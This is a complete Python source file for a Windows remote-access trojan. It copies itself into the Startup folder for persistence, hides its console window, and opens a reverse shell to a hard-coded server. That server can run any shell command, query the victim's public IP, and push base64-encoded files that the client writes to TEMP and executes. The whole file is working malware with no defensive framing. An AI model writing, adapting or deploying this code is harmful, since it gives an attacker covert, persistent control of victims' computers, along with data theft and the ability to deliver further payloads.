import socket
import subprocess
import requests
import ctypes
import os
import base64
import sys
import shutil


user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
hwnd = kernel32.GetConsoleWindow()

def add_to_autostart():
    try:
        # Get the path to the Startup folder
        startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        current_file = os.path.abspath(__file__)
        autostart_path = os.path.join(startup_folder, os.path.basename(current_file))
        
        # Check if already in autostart
        if os.path.exists(autostart_path):
            return
        
        # Copy file to autostart
        shutil.copy(current_file, autostart_path)
    except Exception as e:
        pass  # Silently fail

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(4096).decode()
        if command.lower() == "exit":
            break

        if command.lower() == "getip":
            r = requests.get("https://api.ipify.org?format=json")
            response = r.json()
            output = response["ip"]
            client.send(output.encode())
            continue
        
        # Handle file sending
        if command.startswith("FILE:"):
            try:
                parts = command.split(":", 2)
                file_name = parts[1]
                encoded_data = parts[2]
                file_data = base64.b64decode(encoded_data)
                
                # Save file to temp directory
                temp_path = os.path.join(os.environ["TEMP"], file_name)
                with open(temp_path, "wb") as f:
                    f.write(file_data)
                
                # Execute the file
                subprocess.Popen([sys.executable, temp_path], shell=True)
                output = f"[+] File {file_name} executed successfully"
                client.send(output.encode())
            except Exception as e:
                output = f"[-] Error executing file: {str(e)}"
                client.send(output.encode())
            continue

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output

        client.send(output.encode())
    client.close()

if __name__ == "__main__":
    add_to_autostart()  # Add to autostart on first run
    user32.ShowWindow(hwnd, 0)  # Hide console
    
    # If running from terminal, allow input

    server_ip = "192.168.178.90"  # Change to your server's IP
    server_port = 5555
    start_client(server_ip, server_port)
